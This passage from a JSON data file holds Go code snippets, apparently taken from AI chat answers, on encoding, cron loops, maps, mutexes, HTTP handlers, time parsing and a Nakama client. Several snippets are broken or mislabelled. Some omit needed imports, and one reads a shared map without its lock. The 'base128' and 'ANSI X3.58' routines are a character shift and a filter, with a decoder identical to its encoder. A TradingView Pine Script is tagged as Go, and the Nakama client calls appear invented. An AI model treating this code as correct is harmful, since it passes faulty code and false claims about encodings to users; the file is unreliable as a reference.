reading text:\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tencoded := base128Encode(text)\n\t\t\tfmt.Println(\"Encoded Text:\", encoded)\n\n\t\tcase \"d\":\n\t\t\tfmt.Print(\"Enter the text to decode: \")\n\t\t\ttext, err := reader.ReadString('\\n')\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Error reading text:\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tdecoded := base128Decode(text)\n\t\t\tfmt.Println(\"Decoded Text:\", decoded)\n\n\t\tcase \"q\":\n\t\t\tfmt.Println(\"Exiting the program...\")\n\t\t\treturn\n\n\t\tdefault:\n\t\t\tfmt.Println(\"Invalid option. Please try again.\")\n\t\t}\n\t}\n}\n\nfunc base128Encode(message string) string {\n\tvar encoded []string\n\n\tfor _, char := range message {\n\t\tencoded = append(encoded, string(base128Chars[char]))\n\t}\n\treturn strings.Join(encoded, \"\")\n}\n\nfunc base128Decode(encoded string) string {\n\tvar decoded []rune\n\n\tfor _, char := range encoded {\n\t\tdecoded = append(decoded, rune(strings.IndexRune(base128Chars, char)))\n\t}\n\treturn string(decoded)\n}",
    "filename": "1016c07422bcb2b067c9d927954b08c2_1.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Create a goroutine to run the cron job\n\tgo func() {\n\t\tfor {\n\t\t\t// Execute the cron job logic here\n\t\t\tfmt.Println(\"Cron job executed at:\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\n\t\t\t// Pause the goroutine for the desired interval (e.g., every 5 seconds)\n\t\t\ttime.Sleep(5 * time.Second)\n\t\t}\n\t}()\n\n\t// Keep the main goroutine running indefinitely\n\t// You can add other application logic here if needed\n\tselect {}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_4.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Calculate the duration until the next desired execution time (12 AM)\n\tnow := time.Now()\n\tnextTime := time.Date(now.Year(), now.Month(), now.Day()+1, 0, 0, 0, 0, now.Location())\n\tduration := nextTime.Sub(now)\n\n\t// Wait until the next execution time\n\ttime.Sleep(duration)\n\n\t// Execute the cron job at 12 AM\n\tfmt.Println(\"Cron job executed at:\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\n\t// Add your cron job logic here...\n\n\t// Your application can exit after running the cron job once a day\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_5.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tfor {\n\t\t// Calculate the duration until the next desired execution time (12 AM)\n\t\tnow := time.Now()\n\t\tnextTime := time.Date(now.Year(), now.Month(), now.Day()+1, 0, 0, 0, 0, now.Location())\n\t\tduration := nextTime.Sub(now)\n\n\t\t// Wait until the next execution time\n\t\ttime.Sleep(duration)\n\n\t\t// Execute the cron job at 12 AM\n\t\tfmt.Println(\"Cron job executed at:\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\n\t\t// Add your cron job logic here...\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_6.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\ntype DataStore struct {\n\tdata map[string]string\n\tmu   sync.Mutex\n}\n\nfunc (ds *DataStore) Write(key, value string) {\n\t// Lock the mutex to ensure exclusive access to the data structure\n\tds.mu.Lock()\n\tdefer ds.mu.Unlock()\n\n\t// Write the data to the data structure\n\tds.data[key] = value\n}\n\nfunc main() {\n\t// Create a data structure instance with a mutex\n\tdataStore := &DataStore{\n\t\tdata: make(map[string]string),\n\t}\n\n\t// Launch multiple goroutines to perform parallel writes\n\tfor i := 1; i <= 5; i++ {\n\t\tgo func(n int) {\n\t\t\tkey := fmt.Sprintf(\"Key%d\", n)\n\t\t\tvalue := fmt.Sprintf(\"Value%d\", n)\n\n\t\t\tdataStore.Write(key, value)\n\t\t\tfmt.Printf(\"Data written: %s = %s\\n\", key, value)\n\t\t}(i)\n\t}\n\n\t// Wait for all goroutines to finish writing\n\ttime.Sleep(time.Second)\n\n\t// Print the final data structure contents\n\tfmt.Println(\"\\nFinal data structure:\")\n\tfor key, value := range dataStore.data {\n\t\tfmt.Printf(\"%s = %s\\n\", key, value)\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_7.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tdata := map[string]int{\n\t\t\"key1\": 123,\n\t\t\"key2\": 456,\n\t}\n\n\t// Check if key \"key1\" exists in the map\n\tif value, ok := data[\"key1\"]; ok {\n\t\tfmt.Println(\"Key exists! Value:\", value)\n\t} else {\n\t\tfmt.Println(\"Key does not exist\")\n\t}\n\n\t// Check if key \"key3\" exists in the map\n\tif _, ok := data[\"key3\"]; ok {\n\t\tfmt.Println(\"Key exists!\")\n\t} else {\n\t\tfmt.Println(\"Key does not exist\")\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_8.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tdata := map[string]string{\n\t\t\"key1\": \"value1\",\n\t\t\"key2\": \"value2\",\n\t\t\"key3\": \"value3\",\n\t}\n\n\t// Iterate over the map using range\n\tfor key, value := range data {\n\t\tfmt.Printf(\"Key: %s, Value: %s\\n\", key, value)\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_9.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tdata := make(map[string][]string)\n\n\t// Add values to the map\n\tdata[\"key1\"] = []string{\"value1\", \"value2\"}\n\tdata[\"key2\"] = []string{\"value3\", \"value4\"}\n\tdata[\"key3\"] = []string{\"value5\"}\n\n\t// Access and print the map\n\tfor key, values := range data {\n\t\tfmt.Printf(\"Key: %s, Values: %v\\n\", key, values)\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_10.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tdata := make(map[string][]string)\n\n\t// Add initial values to the map\n\tdata[\"key1\"] = []string{\"value1\", \"value2\"}\n\tdata[\"key2\"] = []string{\"value3\"}\n\n\t// Append more values to \"key1\"\n\tdata[\"key1\"] = append(data[\"key1\"], \"value3\", \"value4\")\n\n\t// Access and print the map\n\tfor key, values := range data {\n\t\tfmt.Printf(\"Key: %s, Values: %v\\n\", key, values)\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_11.go"
  },
  {
    "conversation_hash": "f46eeab1989d3c867377e877ec7aa5fc",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tdata := make(map[string][]string)\n\n\t// Append values to the map\n\tdata[\"key1\"] = append(data[\"key1\"], \"value1\", \"value2\")\n\tdata[\"key2\"] = append(data[\"key2\"], \"value3\")\n\n\t// Access and print the map\n\tfor key, values := range data {\n\t\tfmt.Printf(\"Key: %s, Values: %v\\n\", key, values)\n\t}\n}",
    "filename": "f46eeab1989d3c867377e877ec7aa5fc_12.go"
  },
  {
    "conversation_hash": "a6e36b210c5bef4719b6d54138daf593",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"strconv\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    idStr := r.PostFormValue(\"id\")\n    id, err := strconv.ParseUint(idStr, 10, 64)\n    if err != nil {\n        http.Error(w, \"无效的ID\", http.StatusBadRequest)\n        return\n    }\n\n    // 使用解析后的ID进行查询或其他操作\n    // ...\n\n    // 返回响应\n    w.Write([]byte(\"查询成功\"))\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
    "filename": "a6e36b210c5bef4719b6d54138daf593_3.go"
  },
  {
    "conversation_hash": "a6e36b210c5bef4719b6d54138daf593",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tid := r.PostFormValue(\"id\")\n\tfmt.Println(\"ID:\", id)\n\n\t// 进行查询或其他操作\n\t// ...\n\n\t// 返回响应\n\tw.Write([]byte(\"查询成功\"))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
    "filename": "a6e36b210c5bef4719b6d54138daf593_4.go"
  },
  {
    "conversation_hash": "5febdc16f570ce5473c7b3fdf4685c8b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc base128Encode(value int64) string {\n\t// Tworzenie pustego bufora\n\tbuffer := make([]byte, 0)\n\n\t// Wykonywanie kodowania base128-VLQ\n\tfor {\n\t\t// Pobieranie aktualnej siedmiobitowej grupy\n\t\tgroup := byte(value & 0x7F)\n\n\t\t// Przesunięcie bitowe wartości\n\t\tvalue >>= 7\n\n\t\t// Ustalanie bitu rozszerzenia\n\t\tif value != 0 {\n\t\t\tgroup |= 0x80\n\t\t}\n\n\t\t// Dodawanie grup do bufora w odwrotnej kolejności\n\t\tbuffer = append([]byte{group}, buffer...)\n\n\t\t// Sprawdzanie, czy to jest ostatnia grupa\n\t\tif value == 0 {\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// Konwertowanie bufora na ciąg znaków\n\tencodedString := string(buffer)\n\treturn encodedString\n}\n\nfunc main() {\n\t// Przykładowa wartość do zakodowania\n\tvalue := int64(123456)\n\n\t// Wywołanie funkcji kodującej\n\tencodedValue := base128Encode(value)\n\n\t// Wyświetlenie zakodowanej wartości\n\tfmt.Println(encodedValue)\n}",
    "filename": "5febdc16f570ce5473c7b3fdf4685c8b_0.go"
  },
  {
    "conversation_hash": "3d1ac9de5a7fe106a3d7da6ea2dfea09",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import \"sort\"\n\nfunc threeSum(nums []int) [][]int {\n    n := len(nums)\n    // 对数组进行排序\n    sort.Ints(nums)\n    // 结果列表\n    res := [][]int{}\n    for i := 0; i < n-2; i++ {\n        // 跳过重复的元素\n        if i > 0 && nums[i] == nums[i-1] {\n            continue\n        }\n        // 左指针和右指针\n        left, right := i+1, n-1\n        for left < right {\n            // 三个数的和\n            total := nums[i] + nums[left] + nums[right]\n            if total == 0 {\n                // 找到符合条件的三元组，加入结果列表\n                res = append(res, []int{nums[i], nums[left], nums[right]})\n                // 跳过重复的元素\n                for left < right && nums[left] == nums[left+1] {\n                    left++\n                }\n                for left < right && nums[right] == nums[right-1] {\n                    right--\n                }\n                // 移动指针\n                left++\n                right--\n            } else if total < 0 {\n                // 三数之和小于 0，左指针右移\n                left++\n            } else {\n                // 三数之和大于 0，右指针左移\n                right--\n            }\n        }\n    }\n    return res\n}",
    "filename": "3d1ac9de5a7fe106a3d7da6ea2dfea09_1.go"
  },
  {
    "conversation_hash": "8043e431084aff58be233436e7b08dc0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tstr := \"2022-03-15 09:30:00\"\n\tlayout := \"2006-01-02 15:04:05\"\n\t\n\tt, err := time.Parse(layout, str)\n\tif err != nil {\n\t\tfmt.Println(\"转换失败：\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"转换后的时间：\", t)\n}",
    "filename": "8043e431084aff58be233436e7b08dc0_1.go"
  },
  {
    "conversation_hash": "8043e431084aff58be233436e7b08dc0",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\tfile, err := os.OpenFile(\"log.txt\", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\tlog.SetOutput(file)\n\n\tfmt.Println(\"This will be printed to log file\")\n}",
    "filename": "8043e431084aff58be233436e7b08dc0_3.go"
  },
  {
    "conversation_hash": "8043e431084aff58be233436e7b08dc0",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nfunc main() {\n\t// 使用 application/x-www-form-urlencoded 格式\n\tformData := url.Values{}\n\tformData.Set(\"key1\", \"value1\")\n\tformData.Set(\"key2\", \"value2\")\n\n\tresp, err := http.PostForm(\"http://example.com/api\", formData)\n\tif err != nil {\n\t\tfmt.Println(\"POST 请求失败：\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\t// 使用 application/json 格式\n\tjsonData := []byte(`{\"key1\": \"value1\", \"key2\": \"value2\"}`)\n\n\tresp, err = http.Post(\"http://example.com/api\", \"application/json\", bytes.NewBuffer(jsonData))\n\tif err != nil {\n\t\tfmt.Println(\"POST 请求失败：\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n}",
    "filename": "8043e431084aff58be233436e7b08dc0_4.go"
  },
  {
    "conversation_hash": "8043e431084aff58be233436e7b08dc0",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/submit\", handleFormSubmit)\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\nfunc handleFormSubmit(w http.ResponseWriter, r *http.Request) {\n\terr := r.ParseForm()\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\tdatetimeStr := r.Form.Get(\"datetime\")\n\tlayout := \"2006-01-02T15:04\" // 与<input type=\"datetime-local\">的格式相匹配\n\n\tdatetime, err := time.Parse(layout, datetimeStr)\n\tif err != nil {\n\t\thttp.Error(w, \"Invalid datetime format\", http.StatusBadRequest)\n\t\treturn\n\t}\n\n\t// 处理接收到的日期时间数据\n\tfmt.Println(\"Received datetime:\", datetime)\n}",
    "filename": "8043e431084aff58be233436e7b08dc0_5.go"
  },
  {
    "conversation_hash": "8043e431084aff58be233436e7b08dc0",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\ttimestamp := int64(62072179200)\n\tseconds := timestamp\n\tnanoseconds := 0\n\n\tt := time.Unix(seconds, nanoseconds)\n\n\tfmt.Println(t)\n}",
    "filename": "8043e431084aff58be233436e7b08dc0_6.go"
  },
  {
    "conversation_hash": "8043e431084aff58be233436e7b08dc0",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\ttimestamp := int64(62072179200)\n\tmilliseconds := timestamp\n\tnanoseconds := milliseconds * int64(time.Millisecond)\n\n\tt := time.Unix(0, nanoseconds)\n\n\tfmt.Println(t)\n}",
    "filename": "8043e431084aff58be233436e7b08dc0_7.go"
  },
  {
    "conversation_hash": "0eda2f074f9ac42efea4b7b4bf8b8e82",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Dane wejściowe\n\tinput := \"Lorem ipsum dolor sit amet, consectetur adipiscing elit.\"\n\n\t// Wykonaj test kodowania\n\tstart := time.Now()\n\tencoded := base128Encode(base64Encode(input))\n\telapsed := time.Since(start)\n\n\tfmt.Printf(\"Base128 Encoding Time: %s\\n\", elapsed)\n\tfmt.Printf(\"Encoded: %s\\n\", encoded)\n}\n\nfunc base64Encode(input string) string {\n\tencoded := base64.StdEncoding.EncodeToString([]byte(input))\n\treturn encoded\n}\n\nfunc base128Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tencoded += string(char+1)\n\t}\n\treturn encoded\n}",
    "filename": "0eda2f074f9ac42efea4b7b4bf8b8e82_0.go"
  },
  {
    "conversation_hash": "0eda2f074f9ac42efea4b7b4bf8b8e82",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"encoding/base64\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"Wprowadź ciąg znaków:\")\n\treader := bufio.NewReader(os.Stdin)\n\tinput, _ := reader.ReadString('\\n')\n\n\tfmt.Println(\"Kodowanie ANSI X3.58:\")\n\tansi58Encoded := ansi58Encode(input)\n\tfmt.Println(ansi58Encoded)\n\n\tfmt.Println(\"Kodowanie Base64:\")\n\tbase64Encoded := base64Encode(input)\n\tfmt.Println(base64Encoded)\n\n\tfmt.Println(\"Kodowanie Base128:\")\n\tbase128Encoded := base128Encode(input)\n\tfmt.Println(base128Encoded)\n}\n\nfunc ansi58Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tif char >= ' ' && char <= '~' { // Zakres znaków widocznych w ASCII\n\t\t\tencoded += string(char)\n\t\t}\n\t}\n\treturn encoded\n}\n\nfunc base64Encode(input string) string {\n\tencoded := base64.StdEncoding.EncodeToString([]byte(input))\n\treturn encoded\n}\n\nfunc base128Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tencoded += string(char + 1)\n\t}\n\treturn encoded\n}",
    "filename": "0eda2f074f9ac42efea4b7b4bf8b8e82_1.go"
  },
  {
    "conversation_hash": "0eda2f074f9ac42efea4b7b4bf8b8e82",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\tfmt.Println(\"Wprowadź ciąg znaków:\")\n\treader := bufio.NewReader(os.Stdin)\n\tinput, _ := reader.ReadString('\\n')\n\n\tfmt.Println(\"Kodowanie ANSI X3.58:\")\n\tansi58Encoded := ansi58Encode(input)\n\tfmt.Println(ansi58Encoded)\n\n\tfmt.Println(\"Kodowanie Base64:\")\n\tbase64Encoded := base64Encode(input)\n\tfmt.Println(base64Encoded)\n\n\tfmt.Println(\"Kodowanie Base128:\")\n\tbase128Encoded := base128Encode(input)\n\tfmt.Println(base128Encoded)\n}\n\nfunc ansi58Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tif char >= ' ' && char <= '~' { // Zakres znaków widocznych w ASCII\n\t\t\tencoded += string(char)\n\t\t}\n\t}\n\treturn encoded\n}\n\nfunc base64Encode(input string) string {\n\tencoded := base64.StdEncoding.EncodeToString([]byte(input))\n\treturn encoded\n}\n\nfunc base128Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tencoded += string(char + 1)\n\t}\n\treturn encoded\n}",
    "filename": "0eda2f074f9ac42efea4b7b4bf8b8e82_2.go"
  },
  {
    "conversation_hash": "0eda2f074f9ac42efea4b7b4bf8b8e82",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\tfmt.Println(\"Wprowadź ciąg znaków:\")\n\treader := bufio.NewReader(os.Stdin)\n\tinput, _ := reader.ReadString('\\n')\n\n\t// Kodowanie ANSI X3.58\n\tstart := time.Now()\n\tansi58Encoded := ansi58Encode(input)\n\telapsed := time.Since(start)\n\tfmt.Printf(\"Czas kodowania ANSI X3.58: %s\\n\", elapsed)\n\tfmt.Println(ansi58Encoded)\n\n\t// Dekodowanie ANSI X3.58\n\tstart = time.Now()\n\tansi58Decoded := ansi58Decode(ansi58Encoded)\n\telapsed = time.Since(start)\n\tfmt.Printf(\"Czas dekodowania ANSI X3.58: %s\\n\", elapsed)\n\tfmt.Println(ansi58Decoded)\n\n\t// Kodowanie Base64\n\tstart = time.Now()\n\tbase64Encoded := base64Encode(input)\n\telapsed = time.Since(start)\n\tfmt.Printf(\"Czas kodowania Base64: %s\\n\", elapsed)\n\tfmt.Println(base64Encoded)\n\n\t// Dekodowanie Base64\n\tstart = time.Now()\n\tbase64Decoded := base64Decode(base64Encoded)\n\telapsed = time.Since(start)\n\tfmt.Printf(\"Czas dekodowania Base64: %s\\n\", elapsed)\n\tfmt.Println(base64Decoded)\n\n\t// Kodowanie Base128\n\tstart = time.Now()\n\tbase128Encoded := base128Encode(input)\n\telapsed = time.Since(start)\n\tfmt.Printf(\"Czas kodowania Base128: %s\\n\", elapsed)\n\tfmt.Println(base128Encoded)\n\n\t// Dekodowanie Base128\n\tstart = time.Now()\n\tbase128Decoded := base128Decode(base128Encoded)\n\telapsed = time.Since(start)\n\tfmt.Printf(\"Czas dekodowania Base128: %s\\n\", elapsed)\n\tfmt.Println(base128Decoded)\n}\n\nfunc ansi58Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tif char >= ' ' && char <= '~' { // Zakres znaków widocznych w ASCII\n\t\t\tencoded += string(char)\n\t\t}\n\t}\n\treturn encoded\n}\n\nfunc ansi58Decode(input string) string {\n\tdecoded := \"\"\n\tfor _, char := range input {\n\t\tif char >= ' ' && char <= '~' { // Zakres znaków widocznych w ASCII\n\t\t\tdecoded += string(char)\n\t\t}\n\t}\n\treturn decoded\n}\n\nfunc base64Encode(input string) string {\n\tencoded := base64.StdEncoding.EncodeToString([]byte(input))\n\treturn encoded\n}\n\nfunc base64Decode(input string) string {\n\tdecoded, _ := base64.StdEncoding.DecodeString(input)\n\treturn string(decoded)\n}\n\nfunc base128Encode(input string) string {\n\tencoded := \"\"\n\tfor _, char := range input {\n\t\tencoded += string(char + 1)\n\t}\n\treturn encoded\n}\n\nfunc base128Decode(input string) string {\n\tdecoded := \"\"\n\tfor _, char := range input {\n\t\tdecoded += string(char - 1)\n\t}\n\treturn decoded\n}",
    "filename": "0eda2f074f9ac42efea4b7b4bf8b8e82_3.go"
  },
  {
    "conversation_hash": "2389de9d198d748f7fda809c7be62b40",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// This source code is subject to the terms of the Mozilla Public License 2.0 at https://mozilla.org/MPL/2.0/\n// © Asch-\n\n//@version=5\nindicator(title=\"GAP DETECTOR - Jason\", overlay=true)\n\nlength = input(1500, minval=1, maxval=3000)\nwidth = input(2, minval=1, maxval=5, options=[1,2,3,4,5])\n\ngap_start = ta.valuewhen(true, high, length)\ngap_end = ta.valuewhen(true, low, length - 1)\ngap_bull = false\ngap_bear = false\ninf_gap = 0.0\nsup_gap = 0.0\n\nif barstate.islast\n    for j = 1 to length\n        gap_bull := false\n        gap_bear := false\n        inf_gap := 0.0\n        sup_gap := 0.0\n        \n        if high[j] < low[j - 1] //bull gap\n            gap_start := high[j]\n            gap_end := low[j - 1]\n            gap_bull := true\n            inf_gap := gap_start\n            sup_gap := gap_end\n            for i = (j-1) to 0\n                sup_gap := math.min(sup_gap, low[i])\n            if ((sup_gap - inf_gap)/(syminfo.mintick*10) < .01) // only gap > 5 pips are considered\n                gap_bull := false\n                \n        if low[j] > high[j - 1] //bear gap\n            gap_start := low[j]\n            gap_end := high[j - 1]\n            gap_bear := true\n            inf_gap := gap_end\n            sup_gap := gap_start\n            for i = (j-1) to 0\n                inf_gap := math.max(inf_gap, high[i])\n            if ((sup_gap - inf_gap)/(syminfo.mintick*10) < .01) // only gap > 5 pips are considered\n                gap_bear := false\n        \n        if gap_bull\n            label_bull = label.new(x=bar_index[j], y=na, text='Bull gap: ' + tostring((sup_gap - inf_gap)/(syminfo.mintick*10)) + ' pips\\n' + '[' + tostring(inf_gap) + ' ; ' + tostring(sup_gap) + ']',\n              color=color.green,\n              textcolor=color.white,\n              style=label.style_label_up, yloc=yloc.belowbar)\n            //label.delete(label_bull[1])\n        \n            line_bull_inf = line.new(x1=bar_index[j], y1=inf_gap, \n                                     x2=bar_index, y2=inf_gap,\n                                     extend=extend.right, color=color.green, style=line.style_solid, width=width)\n            //line.delete(line_bull_inf[1])\n            \n            line_bull_sup = line.new(x1=bar_index[j-1], y1=sup_gap, \n                                     x2=bar_index, y2=sup_gap,\n                                     extend=extend.right, color=color.green, style=line.style_solid, width=width)\n            //line.delete(line_bull_sup[1])\n            \n        \n        if gap_bear\n            label_bear = label.new(x=bar_index[j], y=na, text='Bear gap: ' + tostring((sup_gap - inf_gap)/(syminfo.mintick*10)) + ' pips\\n' + '[' + tostring(inf_gap) + ' ; ' + tostring(sup_gap) + ']',\n              color=color.red,\n              textcolor=color.white,\n              style=label.style_label_down, yloc=yloc.abovebar)\n            //label.delete(label_bear[1])\n        \n            line_bear_inf = line.new(x1=bar_index[j-1], y1=inf_gap, \n                                     x2=bar_index, y2=inf_gap,\n                                     extend=extend.right, color=color.red, style=line.style_solid, width=width)\n            //line.delete(line_bear_inf[1])\n            \n            line_bear_sup = line.new(x1=bar_index[j], y1=sup_gap, \n                                     x2=bar_index, y2=sup_gap,\n                                     extend=extend.right, color=color.red, style=line.style_solid, width=width)\n            //line.delete(line_bear_sup[1])",
    "filename": "2389de9d198d748f7fda809c7be62b40_0.go"
  },
  {
    "conversation_hash": "2389de9d198d748f7fda809c7be62b40",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "value1 = 10\nvalue2 = 20\ntext = \"Value 1: {{value1}}, Value 2: {{value2}}\"\ntext := str.replace_all(text, \"{{value1}}\", tostring(value1))\ntext := str.replace_all(text, \"{{value2}}\", tostring(value2))",
    "filename": "2389de9d198d748f7fda809c7be62b40_9.go"
  },
  {
    "conversation_hash": "eadff656c49f34fa9f9842c3f584c49d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/heroiclabs/nakama-common/runtime\"\n\t\"go.uber.org/zap\"\n)\n\nfunc main() {\n\t// 创建一个新的Nakama客户端\n\tconfig := runtime.NewConfig(\"defaultkey\", \"localhost\", 7350, false)\n\tlogger, _ := zap.NewDevelopment()\n\tclient, err := runtime.NewClient(logger, config)\n\tif err != nil {\n\t\tlog.Fatal(\"无法创建Nakama客户端：\", err)\n\t}\n\n\t// 连接到服务器\n\tif err := client.Connect(context.Background(), \"admin\", \"password\"); err != nil {\n\t\tlog.Fatal(\"无法连接到Nakama服务器：\", err)\n\t} else {\n\t\tfmt.Println(\"成功连接到Nakama服务器！\")\n\t}\n\n\t// 在此处执行其他操作，例如创建用户、发送聊天消息等\n\n\t// 关闭连接\n\tclient.Disconnect()\n}",
    "filename": "eadff656c49f34fa9f9842c3f584c49d_1.go"
  },
  {
    "conversation_hash": "5e9ed22ca75a5d9ecbf76e43643da91f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\ntype Task struct {\n\tid int\n}\n\ntype TaskExecutor struct {\n\ttaskChannel chan Task\n}\n\nfunc NewTaskExecutor() *TaskExecutor {\n\treturn &TaskExecutor{\n\t\ttaskChannel: make(chan Task),\n\t}\n}\n\nfunc (te *TaskExecutor) Submit(task Task) {\n\tselect {\n\tcase te.taskChannel <- task:\n\t\tfmt.Printf(\"Task %d submitted\\n\", task.id)\n\tdefault:\n\t\tfmt.Printf(\"Task %d submission failed\\n\", task.id)\n\t}\n}\n\nfunc (te *TaskExecutor) Run() {\n\tfor task := range te.taskChannel {\n\t\tfmt.Printf(\"Starting execution of Task %d\\n\", task.id)\n\t\t// Perform task execution here\n\n\t\tfmt.Printf(\"Finished execution of Task %d\\n\", task.id)\n\t}\n}\n\nfunc main() {\n\ttaskExecutor := NewTaskExecutor()\n\n\tgo taskExecutor.Run()\n\n\tfor i := 1; i <= 60; i++ {\n\t\ttask := Task{id: i}\n\t\ttaskExecutor.Submit(task)\n\t}\n}",
    "filename": "5e9ed22ca75a5d9ecbf76e43643da91f_0.go"
  },
  {
    "conversation_hash": "5e9ed22ca75a5d9ecbf76e43643da91f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
